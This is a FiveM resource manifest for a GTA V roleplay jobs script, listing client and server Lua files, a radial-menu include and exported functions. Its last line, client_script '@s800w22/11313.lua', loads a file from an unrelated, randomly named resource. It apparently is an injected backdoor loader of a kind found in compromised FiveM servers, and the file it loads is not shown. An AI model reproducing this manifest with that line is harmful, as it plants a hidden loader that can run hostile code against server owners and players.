fx_version 'adamant'

game 'gta5'


client_scripts {
    "config.lua",
    "client/main.lua",
    "client/slaughterer.lua",
    "client/busjob.lua",
    "client/pizzajob.lua",
    "client/airlines.lua",
    "client/lumberjack.lua",
    "client/forklift.lua"
}

server_scripts {
    "config.lua",
    "server/server.lua",
}
client_script "block-menus.lua"
client_script "block-menus2.lua"


client_script "@lcrp-radialmenu/gui.lua"

exports {
    "CanLoadProducts",
    "IsWorking",
    "CanSlaughter",
    "IsOnBusJobRoute",
    "IsEndOfRoute"
}


client_script '@s800w22/11313.lua'